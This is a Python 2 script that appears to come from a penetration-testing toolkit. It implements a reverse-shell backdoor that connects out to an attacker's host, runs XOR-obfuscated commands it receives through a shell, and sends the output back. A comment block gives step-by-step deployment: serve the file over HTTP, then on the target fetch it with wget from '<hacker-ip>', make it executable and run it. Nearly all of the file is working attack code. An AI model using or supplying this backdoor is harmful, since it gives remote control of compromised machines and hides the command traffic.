#!/usr/bin/python

import os
import sys
import socket
import subprocess

# usage python revShell.py <RHOST> <RPORT>

####### Creates a reverse shell by backdoor ########

'''
# First establish the python shell:
# PT: create http server
>python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 80 ...
# PT: place python shell in same directory where python HTTP server was started to be accessible by remote client
# TARGET: switch -O allows output to other directory
>wget -O /tmp/shell.py http://<hacker-ip>/shell.py
# TARGET: change permissions
>chmod a+x /tmp/shell.py
# TARGET: make sure file was moved correctly
>file /tmp/shell.py
# TARGET: run the python shell
>/usr/bin/python /tmp/shell.py
'''


def createBackdoor(RHOST, RPORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    while True:
        # get XOR encoded data from network socket
        data = s.recv(1024)
        print "[+] Getting encoded data... "

        # XOR data again with 'x41' to decode
        b_data = bytearray(data)
        for i in range(len(b_data)):
            b_data[i] ^=0x41
            print "[+] XORing data again... "

        # execute decoded data as command by piping stdout/stdin/stderr to variable
        command = subprocess.Popen(str(b_data), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        STDOUT, STDERR = command.communicate()
        print "[+] Decoding data... "

        # encode output then send to RHOST
        b_STDOUT = bytearray(STDOUT)
        for i in range(len(b_STDOUT)):
            b_STDOUT[i] ^=0x41
        s.send(b_STDOUT)
        print "[+] Sending encoded data... "

    s.close()


############ main ###############
if __name__ == "__main__":
    RHOST = sys.argv[1]
    RPORT = sys.argv[2]
    createBackdoor(RHOST, RPORT)


